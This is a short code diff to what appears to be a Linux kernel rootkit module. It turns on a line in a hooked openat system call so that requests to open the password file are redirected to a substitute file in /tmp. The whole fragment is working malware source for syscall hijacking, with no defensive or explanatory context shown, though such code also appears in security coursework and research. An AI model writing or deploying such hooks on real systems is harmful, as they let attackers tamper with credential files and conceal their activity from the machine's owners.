@@ -56,7 +56,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
   unsigned long path_addr = regs->si;
   char * pathname = (char *)path_addr;
   if (strcmp(pathname, PASSWD) == 0) {
-    // copy_to_user(pathname, "/tmp/passwd", strlen("/tmp/passwd") + 1);
+    copy_to_user(pathname, "/tmp/passwd", strlen("/tmp/passwd") + 1);
   }
   return (*original_openat)(regs);
 }
